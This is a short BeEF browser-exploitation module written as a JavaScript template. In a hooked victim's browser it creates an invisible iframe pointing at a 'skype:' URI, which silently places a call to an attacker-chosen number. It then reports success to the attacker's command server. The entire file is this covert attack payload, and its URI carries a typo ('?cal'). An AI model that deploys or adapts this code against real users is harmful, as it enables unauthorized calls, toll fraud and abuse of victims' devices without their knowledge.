beef.execute(function() {
	var sploit = beef.dom.createInvisibleIframe();
	sploit.src = 'skype:<%= @tel_num %>?cal';
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=IFrame Created!");
});
